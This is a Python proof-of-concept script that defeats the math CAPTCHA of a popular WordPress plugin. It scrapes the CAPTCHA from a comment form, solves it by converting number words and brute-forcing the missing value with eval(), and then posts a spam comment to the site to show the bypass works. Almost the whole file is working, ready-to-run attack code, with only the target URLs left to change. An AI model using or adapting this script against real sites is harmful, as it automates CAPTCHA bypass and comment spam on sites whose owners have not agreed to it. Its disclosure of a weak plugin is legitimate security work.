# Proofs uselessness of popular captcha plugin for wordpress
# Software link: http://wordpress.org/plugins/captcha/

# Modify links to test on your site. You should obviously provide correct URI's
# and have the plugin installed.

import requests
import lxml.html
import itertools

N = {'zero': 0,'one': 1,'two': 2,'three': 3,'four': 4,'five': 5,'six': 6,'seven': 7,'eight': 8,'nine': 9,'eleven': 11,'twelve': 12,'thirteen': 13,
'fourteen': 14,'fifteen': 15,'sixteen': 16,'seventeen': 17,'eighteen': 18,'nineteen': 19, 'ten': 10,'twenty': 20,'thirty': 30,
'forty': 40,'fifty': 50,'sixty': 60,'seventy': 70,'eighty': 80,'ninety':90}

OPERATORS = {'+': '+', '−': '-', '×': '*', '/': '/', '=': '='}
 
def R(s, d):
        for key, value in d.items():
                s = s.replace(key, str(value))
        # If we can make a sum of the string, try it (For cases like "twenty four")
        if not has_op(s) and 'y' not in s:
                s = str(sum([int(n) for n in s.split(' ') if n and int(n) in N.values()]))
        return s

# Prevent bad words in eval()        
def whitelist(captcha):
	good = list(itertools.chain(N.keys(), [str(i) for i in N.values()], OPERATORS.keys()))
	for token in captcha.split(' '):
		token = token.strip()
		if token and token not in good:
			print("I failed: [%s]" % token)
			exit('Better not.')
	return captcha

def has_op(expr):
        for o in OPERATORS.keys():
                if o in expr:
                        return True
        return False

def get_op(expr):
        for o in OPERATORS.keys():
                if o in expr:
                        return o
        return False

def solve(captcha):
        # Some example captchas:
        # '9 −  =  eight'
        # '+ 3 =  eight'
        # '9 × one ='
        # '× 8 =  twenty four'
        # We see: Simple mathematical expression consisting of two parts. Let's parse that.
        left, equals, right = captcha.partition('=') # Python is beautiful
        
        if not left.strip():
                left = 'y'
        if not right.strip():
                right = 'y'
                
        left =R(left, N)
        right = R(right, N)

        expr = [left, right][has_op(right)] # expr is the part with the mathematical operator
        
        ll, op, rr = expr.partition(get_op(expr))
        if not ll.strip():
                ll = 'y'
        if not rr.strip():
                rr = 'y'

        # Reassemble
        X = '%s == %s' % ('%s %s %s' % (R(ll, N), OPERATORS[op], R(rr, N)), [right, left][expr==right])
        
        # Brute force
        for i in range(10000):
                if eval(X.replace('y', str(i))):
                        return str(i)

if __name__ == '__main__':
        # Obtain post parameters from comment form
        
        try:
                r = requests.get('http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/')
        except requests.ConnectionError as cerr:
                print('Network problem occured')
        except requests.Timeout as terr:
                print('Connection timeout')
        if not r.ok:
                print('HTTP Error:', r.status_code)

        # Parse parameters and solve captcha
        
        dom = lxml.html.fromstring(r.text.encode('utf-8'))
        el = dom.find_class('cptch_block')[0]
        captcha = el.text_content().strip()
        solution = solve(whitelist(captcha))

        for c in el.getchildren():
                try:
                        if c.attrib['name'] == 'cptch_result':
                                result = c.attrib['value']
                        if c.attrib['name'] == 'cptch_time':
                                time = c.attrib['value']
                except KeyError:
                        pass

        el= dom.find_class('form-submit')[0]
        for c in el.getchildren():
                try:
                        if c.attrib['name'] == 'comment_post_ID':
                                post_id = c.attrib['value']
                        if c.attrib['name'] == 'comment_parent':
                                comment_parent = c.attrib['value']
                except KeyError:
                        pass
        
        print("[+] Solution of captcha '%s' is %s" % (captcha, solution))

        # No write a comment with the cracked captcha to proof that we provided the
        # correct solution.
        payload = {'author': 'spammer', 'email': 'spammer@spamhouse.org', 'url': 'http://spamming.com',
        'cptch_result': result, 'cptch_time': time, 'cptch_number': solution,
        'comment': "Hi there! No protection from spammers!!!:D", 'submit': 'Post+Comment',
        'comment_post_ID': post_id, 'comment_parent': comment_parent}

        try:
                r = requests.post("http://incolumitas.com/wp-comments-post.php", data=payload)
        except requests.ConnectionError as cerr:
                print('Network problem occured')
        except requests.Timeout as terr:
                print('Connection timeout')
        if not r.ok:
                print('HTTP Error:', r.status_code)

        if '''Error: You have entered an incorrect CAPTCHA value.''' in r.text:
                print('[-] Captcha cracking was not successful')
        else:
                print('[+] Comment submitted')
                
